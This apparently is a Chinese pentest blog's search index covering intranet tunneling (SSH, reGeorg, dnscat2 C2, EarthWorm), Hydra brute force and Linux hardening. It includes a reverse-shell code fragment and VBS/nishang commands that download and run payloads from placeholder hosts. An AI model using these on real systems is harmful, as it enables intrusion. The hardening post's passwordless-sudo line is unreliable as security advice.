__out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\\\windows\\\\system32\\\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__nam","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:4:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":" 应用层隧道技术 使用较多 1.SSH隧道 参数 -C # 压缩传输(提高传输速度) -f # 后台执行 -N # 静默连接(建立了链接，但是看不到具体会话) -g # 允许远程主机链接本地用于转发的端口 -L # 本地端口转发 -R # 远程端口转发 -D # 动态转发(SOCKS代理) -P # 指定SSH端口 SSH配置文件 # vim /etc/ssh/sshd_config AllowTcpForwarding yes # 允许转发TCP协议 GatewayPorts yes # 是否允许逻辑主机本地转发端口 PermitRootLogin yes #允许root登录 PasseordAuthentication yes # 允许使用基于密码的认证 TCPKeepAlive yes # 阻止ssh断开 # 然后重启ssh服务 本地转发 # 情景：vps能访问web服务器，vps不能访问数据库服务器，web服务器能访问数据库服务器(需要以web服务器为跳板) # vps上执行 ssh -CfNg -L 1153(vps端口):1.1.1.10(目标):3389(目标端口) root@192.168.1.11(跳板机) # 输入跳板机器的密码 # 含义：将对方的3389端口映射到本地vps的1153上 etstat -antlup |grep \"1153\" # 查看本地端口正在监听 # 连接本地的1153，就可以链接对面的远程链接了 rdesktop 127.0.0.1:1153 # 其实就是一个正向的tcp连接 远程转发 # Web服务器(跳板机器)执行 ssh -CfNg -R 3307(vps端口):1.1.1.10(目标ip):3389(目标端口) root@192.168.1.4(vps地址) # 将目标的3389端口映射到远程vps的3307上 # 连接vps的3307，就可以链接对面的远程链接了 动态转发 # 动态端口映射就建立一个SSH加密的SOCKS 4/5代理通道，任何支持SOCKS 4/5的程序都可以使用这个加密通道进行代理访问 #1. vps上执行 ssh -CfNg -D 7000(vps端口) root@192.168.1.11(跳板机器地址) #2. 浏览器设置网络代理Socks 127.0.0.1:7000。通过浏览器访问内网的机器1.1.1.2的web资源 ... ... 防御思路 在系统中配置SSH远程管理白名单 在ACL中限制只有特定的IP地址才能连接SSH 以及设置系统完全使用带外管理等方法 如果没有足够的资源建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问策略(从外部到内部:从内部到外部) 2.HTTP/HTTPS隧道 常用工具： reGeorg(reDuh)的升级版，把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机。流量特征明显，容易被杀软查杀 下载地址 meterpreter tunna(下载地址) 等等 reGeorg 工具 支持很多种脚本 #1.先把脚本文件上传到目标服务器中，然后远程访问内网网站的某脚本文件 #2.在vps上使用reGeorgSocksProxy.py 脚本来连接 python reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p 9999 # 本机9999端口已经开始监听了 #3.配置ProxyChains，设置全局代理 vim /etc/proxychains.conf dynamic_chain socks4 127.0.0.1 9999 # 设置代理端口 #4.测试代理是否正常 proxyesolv www.baidu.com #5.使用proxychains打开应(通过隧道进行通信) proxychains firefox #6.就可以使用Hydra进行暴力破解rdp(使用http隧道，不会太明显) hydra 1.1.1.2 rdp -l administrator -P /root/pass.txt Hydra 暴力破解密码(支持很多协议) -R # 根据上一次进度继续破解 -S # 使用SSL协议连接 -s # 指定端口 -l # 指定用户名 -L # 指定用户名字典(文件) -p # 指定密码破解 -P # 制定密码字典(文件) -t # 指定多线程数量，默认为16个线程 -vV # 显示详细过程 3.DNS协议(重点) 虽然激增的DNS流量可能会被发现，但基于传统的Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况， DNS、ICMP、HTTP/HTTPS等难以被禁用的协议已经成为i攻击者控制隧道的主要渠道 DNS是一个不可缺少的服务；另一个方面，DNS报文具有穿透防火墙的能力；也由于防火墙和IDS等大都不会过滤DNS流量， 也为DNS成为隐蔽信道创造了条件 C\u0026C(Command and Control Server, 命令控制服务器) – 用来管理僵尸网络和进行APT攻击的服务器 分为：C\u0026C服务端，C\u0026C客户端 由于安全厂商各种措施阻断了C\u0026C通信，通过各种隧道技术实现C\u0026C通信的技术(特别是DNS隧道技术)出现了 DNS隧道原理： DNS查询的域名不存在，会去外网DNS服务器进行查询。如果互联网上有一台定制的服务器，依靠DNS协议即可进行数据包的交换。 在使用DNS隧道与外部进行通信时，从表面看是没有连接外网的(内网网关没有进行转发数据包)，但实际上，内网的DNS服务器进行了中专操作。 就是将其他协议封装在DNS协议中进行传输。 查看DNS的联通性 # 查询当前内部域名和IP地址 cat /etc/resolve.conf |grep -v '#' # 查看能否与内部DNS通信意味着可以使用DNS隧道 nslookup hacker.testlab # 查看能否通过DNS服务器解析外部域名(如果可以，就意味着可以使用DNS隧道实现隐蔽通信) nslookup baidu.com 1).dnscat2工具 下载地址：https://github.com/iagox86/dnscat2 https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell 使用DNS协议创建加密的C\u0026C通道 通过预共享密钥进行身份验证 使用Shell及DNS查询类型(TXT, MX, CNAME, A, AAAA)，多个同时进行的会话类似与SSH中的隧道 客户端是用C写的，服务端是用Ruby写的 dnscat2的隧道有两种模式： - 直连模式：客户端直接向指定IP地址的NDS服务器发起DNS解析请求 - 中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器(速度较慢) 如果目标内网放行所有的DNS请求，dnscat2会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以dnscat开头的，因此通信容易检测。 如果目标内网中请求仅限于白名单服务器或特定的域，dnscat2会使用中继模式来申请一个域名，并将运行dnscat2读无端的服务器指定为受信任的DNS服务器 DNS隧道应用场景： 在安全策略严格的内网环境中，只允许白名单流量出站，同时其他端口都被屏蔽，传统的C\u0026C通信无碍建立，这时候Red Team还有一个选择：使用DNS隐蔽隧道建立通信 dnscat2特点： - 支持多个会话 - 流量加密 - 使用密钥方式MiTM攻击 - 在内存中直接运行Powershell脚本 - 隐蔽通信 使用 1.部署域名解析 # vps(Linux)作为C\u0026C服务端，并需要一个域名(godaddy网站。选择不显眼的域名，选择不实名的，国外的，尽量短) 1.创建A记录，把自己的域名解析服务器指向vps的ip(这里假设起名字ns1.360bobao.xyz) 2.创建NS记录，将dnsch子域名的解析结果指向A记录(名称为vpn指向ns1.360bobao.xyz) # 检测A类解析和NS解析是否成功 在vps上抓包： tcpdump -n -i eth0 udp dst port 53 解析测试(nslookup或dig)： nslookup xxxxx.xxxx.xxxx #如果能抓到对你域名进行查询的DNS请求数据包，就说明第二条NS就诶系设置已经生效 2.安装dnscat2服务端(在vps上) # 先配置Ruby环境，kali内置了Ruby环境，但是运行时候可能缺少一些gem依赖包 # 这里使用ubuntu server apt-get install gem apt-get install ruby-dev apt-get install libpq-dev apt-get install ruby-bundlers git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install # 启动服务端b sudo ruby ./dnscat2.rb vpn.360bobao.** -e open -c pass123456 --no-cache # 如果是采用的直连模式，输入以下命令 sudo ruby ./dnscat2.rb --dns server=127.0.0.1","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:5:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":"SOCKS代理 常见的网络场景 1.服务器在内网，可以任意访问外部网络 2.服务器在内网，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接 3.服务器在内网，对外只开放了部分端口(如80端口)，且服务器不能访问外部网络 SOCKS是一种代理服务，可简单的将一端的系统连接另一端。 SOCKS支持多种协议。 SOCKS分为SOCKS4和SOCKS5。SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP，还支持各种身份验证机制等，标准端口为1080。 SOCKS能与目标内网计算机进行通信，避免多次使用端口转发。 常见SOCKS代理工具 可理解为增强版的lcx。他在服务端监听一个端口，当有新连接出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能 socks代理工具尽量选则小且命令行的 1. EarthWorm(EW) 跨平台，SOCKS5架构，能以正向、反向、多级级联等方式建立网络隧道 下载地址：https://github.com/rootkiter/EarthWorm 新版本Termite: https://github.com/rootkiter/Termite 2. reGeorg(reDuh的升级版) 可以使目标服务器在内网中(或者在设置了端口策略的情况下)连接内部开发端口 利用webshell建立一个socks代理进行内网穿透，服务器必须支持ASPX, PHP, JSP中的一种。 3. sSocks 支持SOCKS5验证，支持IPv6和UDP，并提供反向SOCKS代理服务(将远程计算机作为SOCKS代理服务端反弹到本地) 4. SocksCap64 http://www.sockscap64.com windows上的全局代理软件 即便是本身不支持SOCKS代理的应用程序，也可以通过其实现代理访问 5. Proxifier https://www.proxifier.com/ 6. ProxyChains http://proxychains.sourceforge.net/ https://github.com/haad/proxychains Linux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器 工具使用 1. EarthWorm(EW) 六种命令格式： ssocksd # 用于普通网络环境的正向连接命令 rcsocks # 用于普通网络环境的反向连接命令 rssocks lcx_slave lcx_listen lcx_tran 正向SOCKS 5 服务器 # 适用于目标机器拥有一个外网ip的情况 ew -s ssocksd -l 888 # 假设一个端口为888的SOCKS代理 # 接下来，可以使用SocksCap64添加这个代理地址即可 反弹SOCKS 5 服务器 # 目标机器没有公网IP地址的情况 / 或者在内网内部用 #1.先把ew上传到公网vps中，并执行 ew -s rcsocks -l 1008 -e 888 # 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端 #2.然后把ew上传到web服务器(内网)，并执行 ew -s rssocks -d \u003c公网vps_IP\u003e -e 888 #3.然后用SocksCap64等添加代理地址为vps的ip:1008 #4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了 多级级联： Case1. lcx_tran # 情景：vps能连接web服务器，web服务器能连接数据库服务器但是不能连接DC，数据库服务器能连接DC但是不能访问外网 # 所以，在数据库服务器建立SOCKS服务，端口转发给web服务器，我们可以直接链接web服务器 # 1.在DB服务器 ew -s ssocksd -l 9999 # 2.在vps ew -s lcx_tran -l 1008 -f 127.0.0.1 -g 9999 # 3.使用工具连接vps1008即可 Case2. lcx_listen, lcx_slave #1. vps ew -s lcx_listen -l 1080 -e 8888 #2. DB内网主机 ew -s ssocksd -l 9999 #3. 另一台内网主机 ew -s lcx_slave -d 192.168.0.100 -e 8888 -f 1.1.1.10 -g 9999 #4. 最后连接vps的1080端口 三级级联 #1. vps(192.168.0.103) ew -s lcx_listen -l 1001 -e 113 #2.A ew -s lcx_slave -d 192.168.0.103 -e 113 -f 1.1.1.10 -g 123 #3. B(1.1.1.10) ew -s lcx_listen -l 123 -e 133 #4. C主机，启动SOCKS 5服务，并反弹到B主机的123端口 ew -s rssocks -d 1.1.1.10 -e 133 #5. 使用代理工具连接vps的1001 2.Termite 分为两部分：admin_exe和agent_exe被控者 # Usage 1. 以服务模式启动一个agent服务。 \u003e $ ./agent -l 8888 2. 令管理端连接到agent并对agent进行管理。 \u003e $ ./admin -c 127.0.0.1 -p 8888 3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。 \u003e\u003e help 4. 通过show指令可以得到当前agent的拓扑情况。 \u003e\u003e show 0M +-- 1M 由于当前拓扑中只有一个agent，所以展示结果只有 1M , 其中1 为节点的ID号， M为MacOS系统的简写，Linux为L，Windows简写为W。 5. 将新agent加入当前拓扑 \u003e ./agent -c 127.0.0.1 -p 8888 6. 此时show指令将得到如下效果 0M +-- 1M | +-- 2M 这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。 7. 在2节点开启socks代理，并绑定在本地端口 \u003e\u003e goto 2 将当前被管理节点切换为 2 号节点。 \u003e\u003e socks 1080 此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。 8. 在1号节点开启一个shell并绑定到本地端口 \u003e\u003e goto 1 \u003e\u003e shell 7777 此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell. 9. 将远程的文件下载至本地 \u003e\u003e goto 1 \u003e\u003e downfile 1.txt 2.txt 将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt 10. 上传文件至远程节点 \u003e\u003e goto 2 \u003e\u003e upfile 2.txt 3.txt 将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt 11. 端口转接 \u003e\u003e goto 2 \u003e\u003e lcxtran 3388 10.0.0.1 3389 以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口 # 更多支持 http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4 http://rootkiter.com/toolvideo/toolmp4/2socks.mp4 http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4 http://rootkiter.com/toolvideo/toolmp4/4shell.mp4 http://rootkiter.com/toolvideo/toolmp4/5file.mp4 # 联系作者 rootkiter@rootkiter.com 3. 在Windows下使用SocksCap64实现内网漫游 代理服务器先设置：ew -s lcx_listen -l 10800 -e 888 以管理员权限打开 1.点击代理，添加一个代理(代理服务器的ip和端口) 2.点击闪电图标，测试代理服务器是否正常 3.选择浏览器，右键，选择在代理隧道中运行选择程序，然后就可以自由访问内网了 4. 在Linux下使用ProxyChains实现内网漫游 # kali中安装了ProxyChains，只需配置即可 # vim /etc/proxychains.conf 取消 dynamic_chain 的注释 修改 socks 127.0.0.1 1080 为自己的端口 # 测试是否正常 proxyresolv www.baidu.com # 如提示没找到命令 cp /usr/lib/proxychains3/proxyresolv /use/bin/ # 启动火狐浏览器(使用socks代理) proxychains firefox # 可以访问到内网的站点 # 同样nmap，sqlmap，msf都可以以代理方式运行 proxychains nmap 192.168.0.1/24 proxychains sqlmap -u 192.168.0.12 proxychains msfconsole ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:6:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":"压缩数据 1. RAR 如果目标安装了win.rar，则不必再安装；如果没有安装，则手动安装与系统版本对应的，然后把win.exe拿出来 参数: a 添加要压缩的文件 -k 锁定压缩文件 -s 生成存档文件(提高压缩比) -p 指定压缩密码 -r 递归压缩 -x 指定要排除的文件 -v 分卷打包(大文件时候用处很大) -ep 从名称中排除路径 -ep1 从名称中排除基本目录 -m0 存储，添加到压缩文件时不压缩 -m1 最快，使用最快压缩方式(低压缩比) -m2 较快，使用快速压缩方式 -m3 标准，使用标准压缩方式(默认) -m4 较好，使用较强压缩方式(速度较慢) -m5 最好，使用最强压缩方式(最好的压缩方式，但速度最慢) 以RAR格式压缩/解压 # 压缩 rar.exe a -k -r -s -m3 C:\\\\1.rar C:\\\\apps # 解压 rar.exe e C:\\\\1.rar # -e # 解压到当前根目录下 -x # 以绝对路径解压 # zip和rar一样，修改后缀即可 分卷压缩/解压 # 压缩(每个卷的大小为20MB) rar.exe a -m0 -r -v20m C:\\\\1.rar C:\\\\apps # 解压 rar.exe x C:\\\\1.part01.rar C:\\\\apps 2. 7-Zip 下载地址：https://www.7-zip.org/ 参数： -r 递归压缩 -o 指定输出目录 -p 指定密码 -v 分卷压缩 a 添加压缩文件 x 解压 普通压缩/解压方式 # 压缩 7z.exe a -r -p123456 C:\\apps\\1.7z C:\\apps # 解压 7z.exe x -p123456 C:\\apps\\1.7z -o C:\\apps2 分卷压缩/解压方式 # 压缩（每个分卷20MB） 7z.exe a -r -vlm -p123456 C:\\apps\\1.7z C:\\apps # 解压 7z.exe x -p123456 C:\\apps\\1.7z.001 -o C:\\apps2 ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:7:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["渗透测试"],"content":" 上传和下载 对于不能上传Shell，但是可以执行命令的Windows服务器，可在shell环境中进行上传下载操作 1.利用FTP上传文件 在本地或vps搭建FTP服务器 常用FTP命令 open 192.168.0.10 # 连接服务器 cd \u003c目录\u003e lcd \u003c文件夹路径\u003e # 定位本地文件夹(上传文件的位置或者下载文件的保存位置) type # 查看的当前的传输方式(默认是ASCII码传输) ascii # 设置传输方式为ascii（传输txt等） binary # 设置传输方式为二进制传输（传输exe图片视频声音等） close # 结束与服务器的FTP对话 quit # 结束与服务器的FTP对话并推出FTP环境 put \u003c文件名\u003e [newname] # 上传，如果不指定newname，就为原名字 send \u003c文件名\u003e [newname] # 上传，如果不指定newname，就为原名字 get \u003c文件名\u003e [newname] # 下载，如果不指定newname，就为原名字 mget filename [filename] # 下载多个文件。支持空格和\"?\"两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件） 2. 利用VBS上传文件 主要是是使用msxm12.xmlhttp和adoab.stream 上传 下载 //把下面的命令以此保存到文件（比如 echo \"xxxxxxx\" \u003e\u003e download.vbs） Set Post = CreateObject(\"Msxm12.XMLHTTP\"); Set Shell = CreateObject(\"Wscript.Shell\"); Post.Open \"GET\",\"http://xxxx/target.exe\" Post.Send(); Set aGet = CreateObject(\"ADODB.Stream\"); aGet.Mode = 3 aGet.Type = 1 aGet.Open() aGet.Write(Post.responseBody); aGet.SaveToFile \"C:\\\\test\\target.exe\",2 //保存为download.vbs后，然后执行下面的命令 cscript download.vbs 3. 利用Debug上传 **原理：**将需要上传的exe文件转换为16进制hex形式，再通过echo命令将hex代码写入文件，最后利用Debug功能将hex代码编译并还原为exe文件 # exe2bat.exe 只支持\u003c64KB的文件，方法也较古老 # kali中，exe2bat.exe位于/usr/share/windows-binaries目录下。 # 1.在该目录下执行如下命令，把需要上传的ew.exe文件转换成hex形式 wine exe2bat.exe ew.exe ew.txt # 这里，测试ew.exe代理工具 # 2.然后把上面生成的文本内容复制，echo到目标系统的某个空文件。依次执行命令，生成1.dll, 123.hex, ew.exe copy 1.dll ew.exe 4. 利用Nishang上传 # nishang中的脚本：Download_Execute --\u003e 常用来下载文本文件并将其转为exe文件 #1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1 #2. 利用nishang中的exetotext.ps1脚本将msf生成的msf.exe修改为文本文件msf.txt .\\ExetoText c:\\msf.exe c:\\msf.txt #3. 调用Download_Execute来下载并执行该文件 Download_Execute http://xxxxxx/msf.txt #4. 回到msf的监听窗口，可以看到反弹的shell 5. 利用bitsadmin下载 命令行工具(win xp之后自带的工具)， 通常同于创建下载和上传进程并检测其进展 如果渗透的目标主机使用了网站代理，并且需要活动目录证书，那么bitsadmin可以帮助解决下载文件的问题 Note：bitsadmin不支持HTTPS和FTP协议，也不支持 win xp/ server 2003及以前的版本 6. 利用PowerShell下载 Download() DownloadString() 。。。 整理了一天，越整越乱，头都大了，下次理清了再来优化 ","date":"2020-05-16","objectID":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/:8:0","tags":["渗透测试","内网","隧道技术","端口转发"],"title":"内网第三章-隐藏隧道通信技术","uri":"/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/"},{"categories":["Linux"],"content":"Linux安全加固 一、安装和升级 使用custom自定义安装,不必要的软件包尽量不装,如有必要给lilo/grub引导器加入口令限制, 安装完成后使用up2date或是apt(Debian)升级系统软件, 有时升级内核也是必要的。 编辑 /etc/sudoers 添加下面内容 test1 ALL=NOPASSWD:ALL 二、帐号安全 1、一般服务器都是放在IDC机房,需要通过远程访问进行管理,要限制root的远程访问,管理 员通过普通帐号远程登录,然后su到root,开发人员只使用普通帐号权限。 在/etc/default/login 文件,增加一行设置命令: CONSOLE = /dev/tty01 可以通过下面的脚本禁止对控制台的访问: #! /bin/sh cd /etc/pam.d for i in * do sed '/[^#].*pam_console.so/s/^/#/' foo \u0026\u0026 mv foo $I done 通过下面的措施可以防止任何人都可以su为root,在/etc/pam.d/su中添加如下两行。 auth sufficient /lib/security/$ISA/pam_rootok.so debug = auth required /lib/security/$ISA/pam_wheel.so group=wheel 然后把您想要执行su成为root的用户放入wheel组: usermod -G10 admin 2、编辑/etc/securetty, 注释掉所有允许root远程登录的控制台, 然后禁止使用所有的控制台程 序, 其命令如下: rm -f /etc/security/console.apps/servicename 三、最少服务原则 采用最少服务原则, 凡是不需要的服务一律注释掉。在/etc/inetd.conf中不需要的服务前加\"#\", 较高版本中已经没有inetd, 而换成了Xinetd; 取消开机自动运行服务, 把/etc/rc.d/rc3.d下不需要运行的肥务的第一个字母\"S\"改成\"K\",其他不变. 四、文件系统权限 找出系统中所有含s\"位的程序,把不必要的\"s\"位去掉, 或者把根本不用的直接删除, 这样可以防止用户滥用及提升权限的可能性,其命令如下: find / -type f -perm -4000 -o -perm -2000 -print | xargs ls -lg 把重要文件加上不可改变属性(一般情况不用这么做): chattr +i /etc/passwd Immutable, 系统不允许对这个文件进行任何的修改。如果目录具有这个属性, 那么任何的进程只能修改目录之下的文件,不允许建立和删除文件。 找出系统中没有属主的文件: find / -nouser -o -nogroup 找出任何都有写权限的文件和目录: find / -type f -perm -2 -o -perm -20 |xagrs ls -lg find / -type d -perm -2 -o -perm -20 |xagrs ls -ldg 5)ftp的上传目录不能给与执行权限, 如提供可运行CGI的虚拟主机服务, 应该做额外安全配置. 编辑/etc/security/limits.conf, 加入或改变如下行: hard core 0 hard rss 5000 hard nproc 20 五.Banner伪装 1)入侵者通常通过操作系统、服务及应用程序版本来攻击, 漏洞列表和攻击程也是按此来分类, 所以我们有必要作点手脚来加大入侵的难度。所以编辑/etc/rc.d/rc.local如下: echo \"Kernel $(uname -r) on $a $(uname -m)\" \u003e/etc/issue echo \"Kernel \\r on an \\m\" \u003e\u003e /etc/issue cp -f /etc/issue /etc/issue.net echo \u003e\u003e /etc/issue 2)对于Apache的配置文件,找到ServerTokens和ServerSignature两个directive,修改其默认属性 如下,使用不回显版本号: ServerTokens prod ServerSignature Off 六、IPTABLES防火墙规则: iptables -A INPUT -p --dport 22 -j ACCEPT iptables -A INPUT -i eth0 -p tcp --dport 80 -j ACCEPT iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT iptables -A INPUT -j DROP 以上规则将阻止由内而外的TCP主动选接。 上面是一个简单例子,IPTABLES功能十分强大, 可以根据具体情况设置防火墙规则。 七、tripwire tripwire是一个比较有名的工具,它能帮你判断出一些重要系统文件是否被修改过。现在的Linux发行版中一般部带有该工具的开源版本,在默认的校验对象配置文件中加入一些敏感文件就可以使用。 八.自行扫描 普通的安全加固基本上是做完了,我们可以自己做一个风险评估 ,推荐使用nessus或其他工具。 九.日志策略 主要就是创建对人侵相关的重要日志的硬拷贝, 不致于应急响应的时候连最后的黑匣子都没有。可以把它们重定向到打印机, 管理员邮件, 独立的日志服务器及其热备份。 十.Snort入侵检测系统 对人侵响应和安全日志要求较高的系统有此必要；对于一般的系统而言, 如果管理员根本不会去看一大堆日志, 那么它白白占用系统资源, 就如同鸡肋一样。 对Linux平台下病毒的防范总结出以下几条建议, 仅供参考: (1) 做好系统加固工作。 (2) 留心安全公告,及时修正漏洞。 (3) 日常操作不要使用root权限进行。 (4) 不要随便安装来历不明的各种设备驱动程序。 (5) 不要在重要的服务器上运行一些来历不明的可执行程序或脚本。 (6) 尽量安装防毒软件,并定期升级病毒代码库。 (7) 对于连接到Internet的Linux服务器,要定期检测Linux病毒、蠕虫和木马是否存在。 (8) 对于提供文件服务的Linux服务器,最好部署一款可以同时查杀Windows和Linux病毒的软件。 (9) 对于提供邮件服务的Linux服务器,最好配合使用一个E-mail病毒扫描器。 总而言之，对于Linux平台下病毒的防范要采取多种手段，决不可因为现在Linux病毒很少就掉以轻心。 有些配置文件可能已经过时了，可以根据自己的系统继续加固，未完待续… … 参考的某个资料，但是找不到原文链接了 ","date":"2020-05-11","objectID":"/linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%88%9D%E7%BA%A7/:0:0","tags":["安全加固","Linux"],"title":"Linux安全加固(初级)","uri":"/linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%88%9D%E7%BA%A7/"},{"categories":["Linux"],"content":"容器 有了新武器，并不表示旧武器没有用 题外话 容器 SDN -\u003e 软件定义网络 容器 -\u003e 基于操作系统内核，共享宿主机的CPU -\u003e 操作系统的进程之间进行隔离 -\u003e 安全性比虚拟机差一些 -\u003e 可移植性 什么是容器 有个感性的认识即可，现在还没有明确的统一定义，根据不同产品具体理解 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:0:0","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"常见的容器技术 Docker vs LXD/LXC 不同容器的程序的pid可以相同 越狱 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:1:0","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"Docker 应用程序方面的容器 Docker引擎只可以直接运行在Linux系统上 利用'Boot2Docker'等适配器帮助，使用轻量级'Linux vm'可在mac和微软系统上运行 ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:0","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"安装Docker引擎(两种方法) uname -m # 仅64位系统保障(但32位系统可用) ##### 第一种办法：直接从ubuntu软件包安装(比较旧), 已经有一个老版本ubuntu包名为docker， sudo apt install docker.io systemctl status docker # 将当前用户加入docker组(不用sudo了) sudo usermod -aG docker ${USER} # 重启 ##### 第二种办法： # 安装依赖包 udo apt-get install apt-transport-https ca-certificates curl software-properties-common # 添加docker官方GPG key(防止伪造,供应链攻击) url -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - # 添加docker官方库更新源 sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" # 安装 sudo apt update sudo apt-get install docker-ce # 社区版本 客户端工具: docker ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:1","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"基本命令 # 查看信息 docker version docker info # 查看运行了几个容器 # Registry: 应用程序的仓库(基本linux映像，) # 搜索镜像(有官方有个人的: 用户名/容器名) --\u003e 建议下载官方的image然后自己打造容器 docker search apache2 # 下载镜像 docker pull hello-world # 下载时候指定-a（会下载所有版本） docker pull hello-world -a # 查看镜像 docker images # 运行容器 docker run busybox echo \"hello\" # 删除image docker rmi busybox:1-musl ","date":"2020-05-11","objectID":"/ubuntu-server-%E5%AE%B9%E5%99%A8/:2:2","tags":["ubuntu","容器","Docker","LXD"],"title":"ubuntu server-容器","uri":"/ubuntu-server-%E5%AE%B9%E5%99%A8/"},{"categories":["Linux"],"content":"Docker基本概念 Docker 映像 组成应用程序运行所需的全部文件合集 只读/读写 分层结构(每次对映像的修改都通过commit形成一个新层) 容器层 是基于映像可读写的顶层 